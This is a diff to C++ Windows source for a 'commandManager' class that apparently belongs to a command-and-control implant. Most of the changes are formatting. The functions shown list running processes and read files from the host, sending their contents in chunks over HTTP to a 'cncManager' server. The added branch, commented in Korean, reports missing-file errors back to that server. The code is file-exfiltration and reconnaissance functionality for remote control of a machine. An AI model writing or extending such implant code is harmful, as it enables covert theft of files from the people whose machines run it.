@@ -73,8 +73,8 @@ std::map<DWORD, std::wstring> commandManager::getProcessList() {
     for (DWORD i = 0; i < count; i++) {
         if (procIDList[i] != 0) {
             pName = commandManager::pidToName(procIDList[i]);
-            if(pName != L"")
-                procDict.insert({ procIDList[i],  pName});
+            if (pName != L"")
+                procDict.insert({ procIDList[i],  pName });
         }
     }
 
@@ -83,7 +83,7 @@ std::map<DWORD, std::wstring> commandManager::getProcessList() {
         wprintf(L"%40s(%d)\n", process.second.c_str(), process.first);
     }
     */
-    
+
     return procDict;
 }
 
@@ -154,7 +154,7 @@ void commandManager::getFile(std::string& path, LPCWSTR server) {
     std::cout << path << std::endl;
     cncManager client(server);
     FILE* fp = NULL;
-    UCHAR* buffer = new UCHAR[sizeof(DDprotocol)+DATA_BUF_SIZE]; //450MB
+    UCHAR* buffer = new UCHAR[sizeof(DDprotocol) + DATA_BUF_SIZE]; //450MB
     memset(buffer, 0, sizeof(DDprotocol) + DATA_BUF_SIZE);
     DWORD sequence = 0;
     ULONG64 size = 0;
@@ -163,7 +163,7 @@ void commandManager::getFile(std::string& path, LPCWSTR server) {
     dataFrame->type = ftpResponse;
     dataFrame->seq = 0;
 
-    
+
 
     fopen_s(&fp, path.c_str(), "rb+");
     if (fp) {
@@ -193,11 +193,16 @@ void commandManager::getFile(std::string& path, LPCWSTR server) {
                 memcpy(buffer, dataFrame, sizeof(DDprotocol));
                 client.sendHttpRequest((LPVOID)buffer, sizeof(DDprotocol) + size);
             }
-            
+
 
 
         }
         fclose(fp);
+    }
+    // 파일을 못찾을 시 error 전송
+    else
+    {
+        client.sendData(error, 1, (LPVOID)std::to_string(file_error).c_str());
     }
     delete dataFrame;
     delete[] buffer;
